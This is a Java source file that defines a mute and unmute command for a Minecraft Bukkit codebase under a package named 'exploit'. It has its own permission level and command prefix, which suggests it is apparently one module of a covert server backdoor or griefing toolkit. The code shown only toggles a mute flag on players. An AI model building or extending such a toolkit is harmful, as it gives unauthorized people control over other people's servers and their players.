package com.tmquan2508.exploit.commands;

import com.tmquan2508.exploit.Exploit;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public abstract class AbstractMuteCommand extends Command {
    private final boolean shouldMute;
    private final String actionPastTense;

    public AbstractMuteCommand(boolean shouldMute) {
        super();
        this.shouldMute = shouldMute;
        this.actionPastTense = shouldMute ? "muted" : "unmuted";
    }

    @Override public abstract String getName();
    @Override public abstract String getDescription();
    @Override public int getRequirePerm() { return 2; }
    @Override public String getUsage() { return "<all | player> [name]"; }

    @Override public void execute(Player sender, String[] args) {
        if (args.length < 1) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }

        if (args[0].equalsIgnoreCase("all")) {
            for (Player p : Bukkit.getOnlinePlayers()) Exploit.setState(Exploit.playerStates, p.getName(), Exploit.State.MUTED, this.shouldMute);
            Exploit.sender.sendMessage(sender, "Everyone was " + this.actionPastTense + ".");
        } else if (args[0].equalsIgnoreCase("player")) {
            if (args.length < 2) { Exploit.sender.sendError(sender, "Usage: " + Exploit.config.command_prefix + getName() + " player <name>"); return; }
            Player target = Bukkit.getPlayer(args[1]);
            if (target == null) { Exploit.sender.sendError(sender, "Player not found: " + args[1]); return; }
            Exploit.setState(Exploit.playerStates, target.getName(), Exploit.State.MUTED, this.shouldMute);
            Exploit.sender.sendMessage(sender, target.getName() + " was " + this.actionPastTense + ".");
        } else {
            Exploit.sender.sendError(sender, "Invalid subcommand. " + Exploit.helpers.getRequiredUsage(this));
        }
    }
}